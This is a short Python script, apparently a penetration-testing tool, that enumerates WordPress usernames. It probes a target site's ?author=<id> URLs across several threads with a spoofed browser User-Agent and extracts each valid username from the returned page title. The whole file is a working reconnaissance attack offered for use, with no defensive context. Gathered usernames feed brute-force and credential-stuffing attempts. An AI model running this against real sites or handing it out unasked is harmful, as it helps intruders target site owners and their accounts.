import requests
import argparse
import threading
from bs4 import BeautifulSoup
import time

parser = argparse.ArgumentParser("wordpress user enumeration")
parser.add_argument("--url", "-u", help="base url of the wordpress application")
parser.add_argument("--threads", "-t", help="number of threads", default='4')
parser.add_argument("--limit", "-n", help="limit of author ids", default='20')

def enumerate(wordlist, url):
    try:
        for userid in wordlist:
            response = requests.head(url, params = {"author" : userid})
            print(f"trying: {userid:<30}", end="\r")
            if response.status_code == 200:
                soup = BeautifulSoup(requests.get(url, params = {"author" : userid}, headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36"}).text, features="lxml")
                print(f"Found valid user: {soup.select('title')[0].text.split()[0].lower()}")
    except:
        pass
        

args = parser.parse_args()
url, threads, limit = args.url, int(args.threads), int(args.limit)
wordlist = list(range(1, limit+1))
list_size = (len(wordlist)-1)//threads + 1

start = time.time_ns()
threads = []
for i in range(0, len(wordlist), list_size):
    thread = threading.Thread(target=enumerate, args=(wordlist[i:i+list_size+1], url))
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()
print(f"Finished in {(time.time_ns() - start)//1000000}ms")